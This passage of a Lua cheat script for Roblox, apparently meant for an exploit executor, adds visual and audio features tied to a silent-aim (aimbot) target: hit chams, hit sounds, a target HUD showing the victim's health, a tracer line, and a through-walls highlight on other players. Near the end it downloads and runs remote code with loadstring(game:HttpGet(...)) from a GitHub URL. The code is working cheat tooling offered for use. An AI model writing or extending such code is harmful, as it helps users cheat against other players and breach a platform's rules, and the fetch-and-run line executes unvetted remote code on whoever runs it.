addToggleWithNotify(CrosshairGroup, "CrosshairEnabled", {Text="Crosshair",Default=false,Callback=function(v)
	CrosshairConfig.Enabled = v;
	if v then
		createCrosshair();
	else
		destroyCrosshair();
	end
end}):AddColorPicker("CrosshairColor", {Default=CrosshairConfig.Color,Title="Color",Callback=function(val)
	CrosshairConfig.Color = val;
end});
CrosshairGroup:AddSlider("CrosshairLength", {Text="Length",Default=CrosshairConfig.Length,Min=10,Max=300,Rounding=0,Callback=function(val)
	CrosshairConfig.Length = val;
end});
CrosshairGroup:AddSlider("CrosshairSpacing", {Text="Spacing",Default=CrosshairConfig.Spacing,Min=0,Max=30,Rounding=0,Callback=function(val)
	CrosshairConfig.Spacing = val;
end});
CrosshairGroup:AddSlider("CrosshairThickness", {Text="Thickness",Default=CrosshairConfig.Thickness,Min=1,Max=10,Rounding=0,Callback=function(val)
	CrosshairConfig.Thickness = val;
end});
CrosshairGroup:AddSlider("CrosshairRotSpeed", {Text="RotSpeed",Default=CrosshairConfig.RotSpeed,Min=0,Max=1000,Rounding=0,Callback=function(val)
	CrosshairConfig.RotSpeed = val;
end});
addToggleWithNotify(CrosshairGroup, "CrosshairRotate", {Text="Spin",Default=CrosshairConfig.Rotate,Callback=function(v)
	CrosshairConfig.Rotate = v;
	if not v then
		G.crosshairAngle = CrosshairConfig.StaticAngle;
	end
end});
addToggleWithNotify(CrosshairGroup, "CrosshairOutline", {Text="Outline",Default=CrosshairConfig.Outline,Callback=function(v)
	CrosshairConfig.Outline = v;
	if CrosshairConfig.Enabled then
		createCrosshair();
	end
end}):AddColorPicker("CrosshairOutlineColor", {Default=CrosshairConfig.OutlineColor,Title="Color",Callback=function(val)
	CrosshairConfig.OutlineColor = val;
end});
CrosshairGroup:AddSlider("CrosshairOutlineThickness", {Text="OutlineThick",Default=CrosshairConfig.OutlineThickness,Min=1,Max=20,Rounding=0,Callback=function(val)
	CrosshairConfig.OutlineThickness = val;
end});
addToggleWithNotify(CrosshairGroup, "CrosshairAttachToTarget", {Text="AttachTarget",Default=false,Callback=function(v)
	CrosshairConfig.AttachToTarget = v;
end,Tooltip=">_<"});
CrosshairGroup:AddDropdown("CrosshairAttachPart", {Text="Part",Values={"UpperTorso","HumanoidRootPart","Head","LowerTorso"},Default="UpperTorso",Callback=function(val)
	CrosshairConfig.AttachPart = val;
end,Tooltip=">_<"});
CrosshairGroup:AddSlider("CrosshairAngle", {Text="Angle",Default=CrosshairConfig.StaticAngle,Min=0,Max=360,Rounding=0,Callback=function(val)
	CrosshairConfig.StaticAngle = val;
	if not CrosshairConfig.Rotate then
		crosshairAngle = val;
	end
end});
S.UIS.InputBegan:Connect(function(input, gameProcessed)
	if ((input.KeyCode == Enum.KeyCode.R) and not gameProcessed and CrosshairConfig.Enabled) then
		CrosshairConfig.Rotate = not CrosshairConfig.Rotate;
	end
end);
getgenv().HitChamsConfig = {Enabled=false,Material=Enum.Material.Neon,Duration=2,Color=Color3.fromRGB(255, 255, 255),Transparency=0,NoCollision=true};
local HitChamsConfig = getgenv().HitChamsConfig;
G.HitChamsBodyParts = {"Head","UpperTorso","LowerTorso","LeftUpperArm","LeftLowerArm","LeftHand","RightUpperArm","RightLowerArm","RightHand","LeftUpperLeg","LeftLowerLeg","LeftFoot","RightUpperLeg","RightLowerLeg","RightFoot"};
local function HitChams(Player, config)
	config = config or HitChamsConfig;
	if (not config.Enabled or not Player or not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart")) then
		return;
	end
	pcall(function()
		local PhysicsService = game:GetService("PhysicsService");
		if not pcall(function()
			PhysicsService:GetCollisionGroupName("NoCollision");
		end) then
			PhysicsService:CreateCollisionGroup("NoCollision");
			PhysicsService:CollisionGroupSetCollidable("NoCollision", "Default", false);
		end
	end);
	Player.Character.Archivable = true;
	local Cloned = Player.Character:Clone();
	Cloned.Name = "Player Clone";
	for _, Part in ipairs(Cloned:GetChildren()) do
		if Part:IsA("BasePart") then
			local keep = false;
			for _, validPart in ipairs(G.HitChamsBodyParts) do
				if (Part.Name == validPart) then
					keep = true;
					break;
				end
			end
			if not keep then
				Part:Destroy();
			end
		elseif (Part:IsA("Accessory") or Part:IsA("Tool") or (Part.Name == "face") or Part:IsA("Shirt") or Part:IsA("Pants") or Part:IsA("Hat")) then
			Part:Destroy();
		end
	end
	if Cloned:FindFirstChild("Humanoid") then
		Cloned.Humanoid:Destroy();
	end
	for _, Part in ipairs(Cloned:GetChildren()) do
		if Part:IsA("BasePart") then
			Part.CanCollide = false;
			Part.CanTouch = false;
			Part.CanQuery = false;
			Part.CollisionGroup = "NoCollision";
			Part.Massless = true;
			Part.Anchored = true;
			Part.Transparency = config.Transparency;
			Part.Color = config.Color;
			Part.Material = config.Material;
		end
	end
	if Cloned:FindFirstChild("Head") then
		local head = Cloned.Head;
		head.Transparency = config.Transparency;
		head.Color = config.Color;
		head.Material = config.Material;
		head.CanCollide = false;
		head.CanTouch = false;
		head.CanQuery = false;
		head.CollisionGroup = "NoCollision";
		head.Massless = true;
		head.Size = Vector3.new(0, 0, 0);
		if head:FindFirstChild("face") then
			head.face:Destroy();
		end
	end
	local container = Instance.new("Folder");
	container.Name = "HitChamsContainer";
	container.Parent = S.WS;
	for _, part in pairs(Cloned:GetDescendants()) do
		if part:IsA("BasePart") then
			part.Size = Vector3.new(part.Size.X * 0.9, part.Size.Y * 0.9, part.Size.Z * 0.9);
			part.Position = part.Position + Vector3.new(0, 0.1, 0);
		end
	end
	Cloned.Parent = container;
	local tweenInfo = TweenInfo.new(config.Duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, 0, true);
	for _, Part in ipairs(Cloned:GetChildren()) do
		if Part:IsA("BasePart") then
			S.TS:Create(Part, tweenInfo, {Transparency=1}):Play();
		end
	end
	task.delay(config.Duration, function()
		if (container and container.Parent) then
			container:Destroy();
		end
	end);
	task.spawn(function()
		local hrp = Player.Character:FindFirstChild("HumanoidRootPart");
		if hrp then
			local lastPos = hrp.Position;
			for i = 1, 20 do
				task.wait(0.1);
				if (not hrp or not hrp.Parent) then
					break;
				end
				if (not container or not container.Parent) then
					break;
				end
				if ((hrp.Position - lastPos).Magnitude > 3) then
					if (container and container.Parent) then
						container:Destroy();
					end
					break;
				end
				lastPos = hrp.Position;
			end
		end
	end);
end
getgenv().HitSoundsConfig = {Enabled=false,Sound="Bameware",Volume=1};
local HitSoundsConfig = getgenv().HitSoundsConfig;
getgenv().hitsounds = {RIFK7="rbxassetid://9102080552",Bubble="rbxassetid://6534947588",Minecraft="rbxassetid://8837706727",Cod="rbxassetid://160432334",Bameware="rbxassetid://3124331820",Neverlose="rbxassetid://6534948092",Gamesense="rbxassetid://4817809188",Rust="rbxassetid://1255040462",Bruh="rbxassetid://4578740568",Bell="rbxassetid://6534947240",Pick="rbxassetid://1347140027",Pop="rbxassetid://198598793",Sans="rbxassetid://3188795283",Fart="rbxassetid://130833677",Big="rbxassetid://5332005053",Vine="rbxassetid://5332680810",Fatality="rbxassetid://6534947869",Bonk="rbxassetid://5766898159",Totem="rbxassetid://135055101757201",CSHS="rbxassetid://9065951723"};
local hitsounds = getgenv().hitsounds;
local function PlayHitSound(config)
	config = config or HitSoundsConfig;
	if not config.Enabled then
		return;
	end
	local sound = Instance.new("Sound");
	sound.SoundId = hitsounds[config.Sound] or "";
	sound.Volume = config.Volume or 1;
	sound.Parent = S.SS;
	sound:Play();
	sound.Ended:Connect(function()
		sound:Destroy();
	end);
end
local HitChamsGroup = Tabs.Combat:AddRightGroupbox(">_<");
local HitChamsToggle = addToggleWithNotify(HitChamsGroup, "HitChamsEnabled", {Text="Chams",Default=false,Callback=function(v)
	HitChamsConfig.Enabled = v;
end,Tooltip=">_<"}):AddColorPicker("HitChamsColor", {Default=Color3.fromRGB(255, 255, 255),Title="Color",Callback=function(val)
	HitChamsConfig.Color = val;
end});
local HitSoundsToggle = addToggleWithNotify(HitChamsGroup, "HitSoundsEnabled", {Text="Sounds",Default=false,Callback=function(v)
	HitSoundsConfig.Enabled = v;
end,Tooltip=">_<"});
local HitSoundsSub = HitChamsGroup:AddDependencyBox();
HitSoundsSub:AddDropdown("HitSoundsSound", {Text="Sound",Values=(function()
	local t = {};
	for k in pairs(hitsounds) do
		T.insert(t, k);
	end
	T.sort(t);
	return t;
end)(),Default=HitSoundsConfig.Sound,Callback=function(val)
	HitSoundsConfig.Sound = val;
end});
HitSoundsSub:AddSlider("HitSoundsVolume", {Text="Volume",Default=HitSoundsConfig.Volume,Min=0,Max=3,Rounding=2,Callback=function(val)
	HitSoundsConfig.Volume = val;
end});
HitSoundsSub:SetupDependencies({{Toggles.HitSoundsEnabled,true}});
local lastTarget, lastHP;
RND:Connect(function()
	if (not HitChamsConfig.Enabled and not HitSoundsConfig.Enabled) then
		lastTarget, lastHP = nil, nil;
		return;
	end
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if (target and target.Character and target.Character:FindFirstChild("Humanoid")) then
		local hum = target.Character.Humanoid;
		local hp = hum.Health;
		if (lastTarget ~= target) then
			lastTarget = target;
			lastHP = hp;
		else
			if (hp < lastHP) then
				if HitChamsConfig.Enabled then
					HitChams(target, HitChamsConfig);
				end
				if HitSoundsConfig.Enabled then
					PlayHitSound(HitSoundsConfig);
				end
			end
			lastHP = hp;
		end
	else
		lastTarget, lastHP = nil, nil;
	end
end);
getgenv().TargetHUDGroup = Tabs.Combat:AddRightGroupbox(">_<");
getgenv().G.TargetHUD = {Enabled=false,ScreenGui=nil,MainContainer=nil,CurrentTarget=nil,LastTarget=nil,Connection=nil,NoTargetImage="rbxassetid://7648350113",HealthTween=nil,Opacity=0.8,Scale=1};
getgenv().createTargetHUD = function()
	if G.TargetHUD.ScreenGui then
		G.TargetHUD.ScreenGui:Destroy();
	end
	G.TargetHUD.ScreenGui = Instance.new("ScreenGui");
	G.TargetHUD.ScreenGui.Name = "TargetHUD";
	G.TargetHUD.ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
	G.TargetHUD.ScreenGui.ResetOnSpawn = false;
	G.TargetHUD.ScreenGui.DisplayOrder = 999;
	G.TargetHUD.ScreenGui.Parent = LP.PlayerGui;
	G.TargetHUD.MainContainer = Instance.new("Frame");
	G.TargetHUD.MainContainer.Name = "MainContainer";
	G.TargetHUD.MainContainer.BackgroundColor3 = Library.MainColor;
	G.TargetHUD.MainContainer.BackgroundTransparency = 1 - G.TargetHUD.Opacity;
	G.TargetHUD.MainContainer.BorderColor3 = Library.OutlineColor;
	G.TargetHUD.MainContainer.BorderSizePixel = 1;
	G.TargetHUD.MainContainer.Position = U2.new(0.5, -150, 0.7, 0);
	G.TargetHUD.MainContainer.Size = U2.new(0, 300 * G.TargetHUD.Scale, 0, 100 * G.TargetHUD.Scale);
	G.TargetHUD.MainContainer.AnchorPoint = V2.new(0.5, 0);
	G.TargetHUD.MainContainer.Active = true;
	G.TargetHUD.MainContainer.Draggable = true;
	G.TargetHUD.MainContainer.Parent = G.TargetHUD.ScreenGui;
	G.TargetHUD.AvatarContainer = Instance.new("Frame");
	G.TargetHUD.AvatarContainer.Name = "AvatarContainer";
	G.TargetHUD.AvatarContainer.BackgroundColor3 = Library.MainColor;
	G.TargetHUD.AvatarContainer.BackgroundTransparency = 0.3;
	G.TargetHUD.AvatarContainer.BorderColor3 = Library.OutlineColor;
	G.TargetHUD.AvatarContainer.BorderSizePixel = 1;
	G.TargetHUD.AvatarContainer.Position = U2.new(0.05, 0, 0.2, 0);
	G.TargetHUD.AvatarContainer.Size = U2.new(0, 60 * G.TargetHUD.Scale, 0, 60 * G.TargetHUD.Scale);
	G.TargetHUD.AvatarContainer.Visible = true;
	G.TargetHUD.AvatarContainer.ZIndex = 2;
	G.TargetHUD.AvatarContainer.Parent = G.TargetHUD.MainContainer;
	G.TargetHUD.AvatarImage = Instance.new("ImageLabel");
	G.TargetHUD.AvatarImage.Name = "AvatarImage";
	G.TargetHUD.AvatarImage.BackgroundTransparency = 1;
	G.TargetHUD.AvatarImage.Size = U2.new(1, 0, 1, 0);
	G.TargetHUD.AvatarImage.Image = G.TargetHUD.NoTargetImage;
	G.TargetHUD.AvatarImage.ScaleType = Enum.ScaleType.Crop;
	G.TargetHUD.AvatarImage.ZIndex = 3;
	G.TargetHUD.AvatarImage.Parent = G.TargetHUD.AvatarContainer;
	G.TargetHUD.InfoContainer = Instance.new("Frame");
	G.TargetHUD.InfoContainer.Name = "InfoContainer";
	G.TargetHUD.InfoContainer.BackgroundTransparency = 1;
	G.TargetHUD.InfoContainer.Position = U2.new(0.3, 0, 0.2, 0);
	G.TargetHUD.InfoContainer.Size = U2.new(0.65, -10, 0, 60 * G.TargetHUD.Scale);
	G.TargetHUD.InfoContainer.ZIndex = 2;
	G.TargetHUD.InfoContainer.Parent = G.TargetHUD.MainContainer;
	G.TargetHUD.UsernameLabel = Instance.new("TextLabel");
	G.TargetHUD.UsernameLabel.Name = "UsernameLabel";
	G.TargetHUD.UsernameLabel.BackgroundTransparency = 1;
	G.TargetHUD.UsernameLabel.Size = U2.new(1, 0, 0.4, 0);
	G.TargetHUD.UsernameLabel.Font = Library.Font;
	G.TargetHUD.UsernameLabel.Text = "No target";
	G.TargetHUD.UsernameLabel.TextColor3 = Library.FontColor;
	G.TargetHUD.UsernameLabel.TextSize = 16;
	G.TargetHUD.UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left;
	G.TargetHUD.UsernameLabel.TextTruncate = Enum.TextTruncate.AtEnd;
	G.TargetHUD.UsernameLabel.ZIndex = 3;
	G.TargetHUD.UsernameLabel.Parent = G.TargetHUD.InfoContainer;
	G.TargetHUD.HealthContainer = Instance.new("Frame");
	G.TargetHUD.HealthContainer.Name = "HealthContainer";
	G.TargetHUD.HealthContainer.BackgroundColor3 = Library.BackgroundColor;
	G.TargetHUD.HealthContainer.BorderColor3 = Library.OutlineColor;
	G.TargetHUD.HealthContainer.BorderSizePixel = 1;
	G.TargetHUD.HealthContainer.Position = U2.new(0, 0, 0.6, 5);
	G.TargetHUD.HealthContainer.Size = U2.new(1, 0, 0.3, 0);
	G.TargetHUD.HealthContainer.ZIndex = 3;
	G.TargetHUD.HealthContainer.Parent = G.TargetHUD.InfoContainer;
	G.TargetHUD.HealthBar = Instance.new("Frame");
	G.TargetHUD.HealthBar.Name = "HealthBar";
	G.TargetHUD.HealthBar.BackgroundColor3 = Library.AccentColor;
	G.TargetHUD.HealthBar.BorderSizePixel = 0;
	G.TargetHUD.HealthBar.Size = U2.new(1, 0, 1, 0);
	G.TargetHUD.HealthBar.ZIndex = 4;
	G.TargetHUD.HealthBar.Parent = G.TargetHUD.HealthContainer;
	G.TargetHUD.HealthText = Instance.new("TextLabel");
	G.TargetHUD.HealthText.Name = "HealthText";
	G.TargetHUD.HealthText.BackgroundTransparency = 1;
	G.TargetHUD.HealthText.Size = U2.new(1, 0, 1, 0);
	G.TargetHUD.HealthText.Font = Library.Font;
	G.TargetHUD.HealthText.Text = "100%";
	G.TargetHUD.HealthText.TextColor3 = Library.FontColor;
	G.TargetHUD.HealthText.TextSize = 14;
	G.TargetHUD.HealthText.TextStrokeTransparency = 0.7;
	G.TargetHUD.HealthText.TextYAlignment = Enum.TextYAlignment.Center;
	G.TargetHUD.HealthText.TextXAlignment = Enum.TextXAlignment.Center;
	G.TargetHUD.HealthText.ZIndex = 5;
	G.TargetHUD.HealthText.Parent = G.TargetHUD.HealthContainer;
	G.TargetHUD.MainContainer.Visible = false;
	task.spawn(function()
		task.wait();
		getgenv().updateTargetHUDTheme();
	end);
	return G.TargetHUD.ScreenGui, G.TargetHUD.MainContainer;
end;
getgenv().updateTargetInfo = function(player)
	if not G.TargetHUD.MainContainer then
		return;
	end
	if (player ~= G.TargetHUD.LastTarget) then
		if player then
			G.TargetHUD.MainContainer.Visible = true;
			G.TargetHUD.MainContainer.BackgroundTransparency = 1;
			S.TS:Create(G.TargetHUD.MainContainer, TweenInfo.new(0.3), {BackgroundTransparency=(1 - G.TargetHUD.Opacity)}):Play();
		else
			S.TS:Create(G.TargetHUD.MainContainer, TweenInfo.new(0.3), {BackgroundTransparency=1}):Play();
			task.delay(0.3, function()
				if (G.TargetHUD.CurrentTarget == nil) then
					G.TargetHUD.MainContainer.Visible = false;
				end
			end);
		end
	end
	if (player and player.Character) then
		G.TargetHUD.MainContainer.InfoContainer.UsernameLabel.Text = ((player.DisplayName ~= "") and player.DisplayName) or player.Name;
		G.TargetHUD.MainContainer.AvatarContainer.AvatarImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png";
		local humanoid = player.Character:FindFirstChildOfClass("Humanoid");
		if humanoid then
			local healthPercent = humanoid.Health / humanoid.MaxHealth;
			if (G.TargetHUD.HealthTween and (G.TargetHUD.HealthTween.PlaybackState == Enum.PlaybackState.Playing)) then
				G.TargetHUD.HealthTween:Cancel();
			end
			G.TargetHUD.HealthTween = S.TS:Create(G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size=U2.new(healthPercent, 0, 1, 0)});
			G.TargetHUD.HealthTween:Play();
			G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthText.Text = STR.fmt("%d%%", M.floor(healthPercent * 100));
			local healthColor = Library.AccentColor:Lerp(C3.fromRGB(255, 50, 50), (1 - healthPercent) * 0.7);
			S.TS:Create(G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3=healthColor}):Play();
		end
	else
		G.TargetHUD.MainContainer.InfoContainer.UsernameLabel.Text = "No target";
		G.TargetHUD.MainContainer.AvatarContainer.AvatarImage.Image = G.TargetHUD.NoTargetImage;
		S.TS:Create(G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthBar, TweenInfo.new(0.3), {Size=U2.new(0, 0, 1, 0)}):Play();
		G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthText.Text = "0%";
	end
	G.TargetHUD.LastTarget = player;
	G.TargetHUD.CurrentTarget = player;
end;
getgenv().toggleTargetHUD = function(enabled)
	G.TargetHUD.Enabled = enabled;
	if enabled then
		if not G.TargetHUD.ScreenGui then
			getgenv().createTargetHUD();
		end
		if G.TargetHUD.Connection then
			G.TargetHUD.Connection:Disconnect();
		end
		if G.TargetHUD.PlayerRemoving then
			G.TargetHUD.PlayerRemoving:Disconnect();
		end
		G.TargetHUD.PlayerRemoving = S.PS.PlayerRemoving:Connect(function(player)
			if (G.TargetHUD.CurrentTarget == player) then
				getgenv().updateTargetInfo(nil);
				if (getgenv().SilentAim and (getgenv().SilentAim.currentTarget == player)) then
					getgenv().SilentAim.currentTarget = nil;
				end
			end
		end);
		G.TargetHUD.Connection = S.RS.Heartbeat:Connect(function()
			local currentTarget = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
			if (currentTarget and not S.PS:FindFirstChild(currentTarget.Name)) then
				currentTarget = nil;
				if getgenv().SilentAim then
					getgenv().SilentAim.currentTarget = nil;
				end
			end
			if (currentTarget ~= G.TargetHUD.CurrentTarget) then
				getgenv().updateTargetInfo(currentTarget);
			end
			if (currentTarget and currentTarget.Character) then
				local humanoid = currentTarget.Character:FindFirstChildOfClass("Humanoid");
				if (humanoid and G.TargetHUD.MainContainer and G.TargetHUD.MainContainer.Visible) then
					local healthPercent = humanoid.Health / humanoid.MaxHealth;
					if (G.TargetHUD.HealthTween and (G.TargetHUD.HealthTween.PlaybackState == Enum.PlaybackState.Playing)) then
						G.TargetHUD.HealthTween:Cancel();
					end
					G.TargetHUD.HealthTween = S.TS:Create(G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size=U2.new(healthPercent, 0, 1, 0)});
					G.TargetHUD.HealthTween:Play();
					G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthText.Text = STR.fmt("%d%%", M.floor(healthPercent * 100));
					local healthColor = Library.AccentColor:Lerp(C3.fromRGB(255, 50, 50), (1 - healthPercent) * 0.7);
					S.TS:Create(G.TargetHUD.MainContainer.InfoContainer.HealthContainer.HealthBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3=healthColor}):Play();
				end
			end
		end);
	else
		if G.TargetHUD.Connection then
			G.TargetHUD.Connection:Disconnect();
			G.TargetHUD.Connection = nil;
		end
		if G.TargetHUD.PlayerRemoving then
			G.TargetHUD.PlayerRemoving:Disconnect();
			G.TargetHUD.PlayerRemoving = nil;
		end
		if G.TargetHUD.MainContainer then
			G.TargetHUD.MainContainer.Visible = false;
		end
		G.TargetHUD.CurrentTarget = nil;
		G.TargetHUD.LastTarget = nil;
	end
end;
local TargetHUDToggle = addToggleWithNotify(getgenv().TargetHUDGroup, "TargetHUD", {Text="TargetHUD",Default=false,Callback=function(v)
	getgenv().toggleTargetHUD(v);
end,Tooltip="Отображает информацию о цели аимбота"});
getgenv().CombatTracerConfig = {Enabled=false,Color=Color3.fromRGB(255, 255, 255)};
local CombatTracerConfig = getgenv().CombatTracerConfig;
getgenv().combatTracerLine = nil;
local combatTracerLine = getgenv().combatTracerLine;
addToggleWithNotify(HitChamsGroup, "CombatTracerEnabled", {Text="Tracer",Default=false,Callback=function(v)
	CombatTracerConfig.Enabled = v;
	if (not v and combatTracerLine) then
		combatTracerLine.Visible = false;
	end
end}):AddColorPicker("CombatTracerColor", {Default=Color3.fromRGB(255, 255, 255),Title="Color",Callback=function(val)
	CombatTracerConfig.Color = val;
	if combatTracerLine then
		combatTracerLine.Color = val;
	end
end});
HRT:Connect(function()
	if not CombatTracerConfig.Enabled then
		if combatTracerLine then
			combatTracerLine.Visible = false;
		end
		return;
	end
	local now = tick();
	if ((now - G.lastTracerUpdate) < G.tracerUpdateInterval) then
		return;
	end
	G.lastTracerUpdate = now;
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if (target and target.Character) then
		local torso = target.Character:FindFirstChild("UpperTorso") or target.Character:FindFirstChild("HumanoidRootPart");
		if torso then
			local screenPos, onScreen = S.WS.CurrentCamera:WorldToViewportPoint(torso.Position);
			if onScreen then
				local mousePos = S.UIS:GetMouseLocation();
				if not combatTracerLine then
					combatTracerLine = Drawing.new("Line");
					combatTracerLine.Thickness = 2;
					combatTracerLine.Color = CombatTracerConfig.Color;
					combatTracerLine.ZIndex = 10000;
				end
				combatTracerLine.From = mousePos;
				combatTracerLine.To = Vector2.new(screenPos.X, screenPos.Y);
				combatTracerLine.Color = CombatTracerConfig.Color;
				combatTracerLine.Visible = true;
			elseif combatTracerLine then
				combatTracerLine.Visible = false;
			end
		elseif combatTracerLine then
			combatTracerLine.Visible = false;
		end
	elseif combatTracerLine then
		combatTracerLine.Visible = false;
	end
end);
local HitEffectsConfig = {Enabled=false,Type="Nova",Color=Color3.fromRGB(255, 255, 255)};
local hitEffectsTypes = {"Nova","Crescent Slash","Coom","Cosmic Explosion","Slash","Atomic Slash"};
local HighlightConfig = {Enabled=false,OutlineColor=Color3.fromRGB(255, 255, 255),FillColor=Color3.fromRGB(255, 255, 255),OutlineTransparency=0,FillTransparency=0.5,CurrentHighlight=nil};
local HitEffectsToggle = addToggleWithNotify(HitChamsGroup, "HitEffectsEnabled", {Text="HitEffects",Default=false,Callback=function(v)
	HitEffectsConfig.Enabled = v;
end,Tooltip=">_<"}):AddColorPicker("HitEffectsColor", {Default=Color3.fromRGB(255, 255, 255),Title="Color",Callback=function(val)
	HitEffectsConfig.Color = val;
end});
local HitEffectsSub = HitChamsGroup:AddDependencyBox();
HitEffectsSub:AddDropdown("HitEffectsType", {Text="EffectType",Values=hitEffectsTypes,Default=HitEffectsConfig.Type,Callback=function(val)
	HitEffectsConfig.Type = val;
end});
HitEffectsSub:SetupDependencies({{Toggles.HitEffectsEnabled,true}});
local HitNotificationsConfig = {Enabled=false,Duration=2,ShowDamage=true,ShowRemaining=true};
local HitNotificationsToggle = addToggleWithNotify(HitChamsGroup, "HitNotificationsEnabled", {Text="HitNotifications",Default=false,Callback=function(v)
	HitNotificationsConfig.Enabled = v;
end,Tooltip=">_<"});
local HitNotificationsSub = HitChamsGroup:AddDependencyBox();
HitNotificationsSub:AddSlider("HitNotificationsDuration", {Text="Duration",Default=HitNotificationsConfig.Duration,Min=1,Max=5,Rounding=0,Callback=function(val)
	HitNotificationsConfig.Duration = val;
end});
HitNotificationsSub:AddToggle("HitNotificationsShowDamage", {Text="Show Damage",Default=HitNotificationsConfig.ShowDamage,Callback=function(v)
	HitNotificationsConfig.ShowDamage = v;
end});
HitNotificationsSub:AddToggle("HitNotificationsShowRemaining", {Text="Show HP",Default=HitNotificationsConfig.ShowRemaining,Callback=function(v)
	HitNotificationsConfig.ShowRemaining = v;
end});
HitNotificationsSub:SetupDependencies({{Toggles.HitNotificationsEnabled,true}});
local HighlightToggle = addToggleWithNotify(HitChamsGroup, "HighlightEnabled", {Text="Highlight",Default=false,Callback=function(v)
	HighlightConfig.Enabled = v;
	if (not v and HighlightConfig.CurrentHighlight) then
		pcall(function()
			HighlightConfig.CurrentHighlight:Destroy();
			HighlightConfig.CurrentHighlight = nil;
		end);
	end
end,Tooltip=">_<"}):AddColorPicker("HighlightOutlineColor", {Default=Color3.fromRGB(255, 255, 255),Title="Outline",Callback=function(val)
	HighlightConfig.OutlineColor = val;
	if HighlightConfig.CurrentHighlight then
		HighlightConfig.CurrentHighlight.OutlineColor = val;
	end
end}):AddColorPicker("HighlightFillColor", {Default=Color3.fromRGB(255, 255, 255),Title="Fill",Callback=function(val)
	HighlightConfig.FillColor = val;
	if HighlightConfig.CurrentHighlight then
		HighlightConfig.CurrentHighlight.FillColor = val;
	end
end});
local HighlightSub = HitChamsGroup:AddDependencyBox();
HighlightSub:AddSlider("HighlightOutlineTransparency", {Text="Outline Transparency",Default=HighlightConfig.OutlineTransparency,Min=0,Max=1,Rounding=2,Callback=function(val)
	HighlightConfig.OutlineTransparency = val;
	if HighlightConfig.CurrentHighlight then
		HighlightConfig.CurrentHighlight.OutlineTransparency = val;
	end
end});
HighlightSub:AddSlider("HighlightFillTransparency", {Text="Fill Transparency",Default=HighlightConfig.FillTransparency,Min=0,Max=1,Rounding=2,Callback=function(val)
	HighlightConfig.FillTransparency = val;
	if HighlightConfig.CurrentHighlight then
		HighlightConfig.CurrentHighlight.FillTransparency = val;
	end
end});
HighlightSub:SetupDependencies({{Toggles.HighlightEnabled,true}});
G.HitEffectsLib = nil;
G.hitEffectsLoading = false;
local function getHitEffectsLib()
	if G.HitEffectsLib then
		return G.HitEffectsLib;
	end
	if G.hitEffectsLoading then
		return nil;
	end
	G.hitEffectsLoading = true;
	task.spawn(function()
		pcall(function()
			G.HitEffectsLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXCdswqezxc/halalware/refs/heads/main/effects"))();
		end);
		G.hitEffectsLoading = false;
	end);
	return nil;
end
local lastTarget, lastHP = nil, nil;
G.updateHighlight = function(target)
	if not HighlightConfig.Enabled then
		if HighlightConfig.CurrentHighlight then
			pcall(function()
				HighlightConfig.CurrentHighlight:Destroy();
				HighlightConfig.CurrentHighlight = nil;
			end);
		end
		return;
	end
	if (not target or not target.Character) then
		if HighlightConfig.CurrentHighlight then
			pcall(function()
				HighlightConfig.CurrentHighlight:Destroy();
				HighlightConfig.CurrentHighlight = nil;
			end);
		end
		return;
	end
	if HighlightConfig.CurrentHighlight then
		if (HighlightConfig.CurrentHighlight.Parent ~= target.Character) then
			pcall(function()
				HighlightConfig.CurrentHighlight:Destroy();
				HighlightConfig.CurrentHighlight = nil;
			end);
		end
	end
	if not HighlightConfig.CurrentHighlight then
		pcall(function()
			local highlight = Instance.new("Highlight");
			highlight.OutlineColor = HighlightConfig.OutlineColor;
			highlight.FillColor = HighlightConfig.FillColor;
			highlight.OutlineTransparency = HighlightConfig.OutlineTransparency;
			highlight.FillTransparency = HighlightConfig.FillTransparency;
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop;
			highlight.Parent = target.Character;
			HighlightConfig.CurrentHighlight = highlight;
		end);
	end
end;
G.processHitEffects = function(target, previousHP)
	if (not target or not target.Character or not target.Character:FindFirstChild("Humanoid")) then
		return;
	end
	G.lastDamageTick = tick();
	lastHP = previousHP;
	if HitChamsConfig.Enabled then
		HitChams(target, HitChamsConfig);
	end
	if HitSoundsConfig.Enabled then
		PlayHitSound(HitSoundsConfig);
	end
	if HitEffectsConfig.Enabled then
		task.spawn(function()
			local lib = getHitEffectsLib();
			if (lib and lib.Functions and lib.Functions.Effect) then
				lib.Functions.Effect(target.Character, HitEffectsConfig.Type, HitEffectsConfig.Color);
			end
		end);
	end
	if (HitNotificationsConfig.Enabled and target.Character:FindFirstChild("Humanoid")) then
		local hum = target.Character.Humanoid;
		local notifText = ">_<";
		if (HitNotificationsConfig.ShowDamage or HitNotificationsConfig.ShowRemaining) then
			local damage = lastHP - hum.Health;
			if HitNotificationsConfig.ShowDamage then
				notifText = notifText .. " -" .. math.floor(damage);
			end
			if HitNotificationsConfig.ShowRemaining then
				notifText = notifText .. " [" .. math.floor(hum.Health) .. " HP]";
			end
		end
		Library:Notify(notifText, HitNotificationsConfig.Duration);
	end
end;
HRT:Connect(function()
	local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget;
	if HighlightConfig.Enabled then
		G.updateHighlight(target);
	end
	if (not HitChamsConfig.Enabled and not HitSoundsConfig.Enabled and not HitEffectsConfig.Enabled and not HitNotificationsConfig.Enabled) then
		lastTarget, lastHP = nil, nil;
		return;
	end
